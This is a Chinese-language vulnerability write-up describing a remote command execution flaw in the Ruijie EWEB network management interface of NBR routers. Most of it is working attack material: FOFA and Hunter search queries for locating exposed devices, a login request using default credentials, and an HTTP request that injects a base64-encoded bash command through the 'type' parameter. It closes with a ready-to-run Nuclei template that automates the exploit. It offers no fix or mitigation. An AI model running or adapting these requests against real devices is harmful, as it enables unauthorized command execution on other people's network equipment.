# 锐捷EWEB flwo.contro存在远程命令执行漏洞

# 一、漏洞简介
锐捷EWEB flwo.contro存在远程命令执行漏洞

# 二、影响版本
+ 锐捷NBR路由器

# 三、资产测绘
+ hunter`app.name=="Ruijie 锐捷 EWEB"`
+ fofa`title="锐捷网络-EWEB网管系统"`
+ 登录页面![1715322581874-fa3273b6-555a-497f-a4ef-ba0b586cab54.png](./img/TFOZ7WRYk6ynbZLx/1715322581874-fa3273b6-555a-497f-a4ef-ba0b586cab54-866973.png)

# 四、漏洞复现
 先发送数据包，获取cookie  

```http
POST /ddi/server/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 

username=admin&password=admin?
```

![1715323041665-52c124a1-a313-42dd-8797-fe5f1386b46c.png](./img/TFOZ7WRYk6ynbZLx/1715323041665-52c124a1-a313-42dd-8797-fe5f1386b46c-753050.png)

 使用获取cookie执行命令  

```http
cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx 
Bsae64解码
rm -rf ../ikm123.txt && echo HelloWorld > ../ikm123.txt 2>&1
```

```http
POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 160
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=e3t2n743strq8lu1anqod3bhu6;
Accept-Encoding: gzip

type=%7Cbash+-c+%27echo+cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
```

![1715323240193-01afe809-d76e-4d69-8be8-d16470a63556.png](./img/TFOZ7WRYk6ynbZLx/1715323240193-01afe809-d76e-4d69-8be8-d16470a63556-647634.png)

 3、命令执行成功 

```http
/ikm123.txt
```

![1715323343958-2af6502d-a935-4e8d-8360-dcf53b32a982.png](./img/TFOZ7WRYk6ynbZLx/1715323343958-2af6502d-a935-4e8d-8360-dcf53b32a982-871259.png)

## 五、 Nuclei
```http
id: RJEWEB-flwo-contro-RCE

info:
  name: 锐捷 EWEB-RCE-flwo.contro
  author: haoguoguo
  severity: high
  metadata: 
    fofa-query: title="锐捷网络-EWEB网管系统"
variables:
  filename: "{{to_lower(rand_base(5))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        POST /ddi/server/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 

        username=admin&password=admin?

      - |
        POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Connection: close
        Content-Length: 160
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        type=%7Cbash+-c+%27echo+{{base64("rm -rf ../{{filename}}.txt && echo HelloWorld > ../{{filename}}.txt 2>&1")}}+%7C+base64+-d+%7C+bash+%26%26+exit+0%27

      - |
        GET /{{filename}}.txt HTTP/1.1
        Host:{{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"HelloWorld")
```

![1715322761109-4303e648-4b49-4d38-8c6e-cb1348e035dc.png](./img/TFOZ7WRYk6ynbZLx/1715322761109-4303e648-4b49-4d38-8c6e-cb1348e035dc-278160.png)



> 更新: 2024-06-24 11:42:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wqfe5713gy2pdu2v>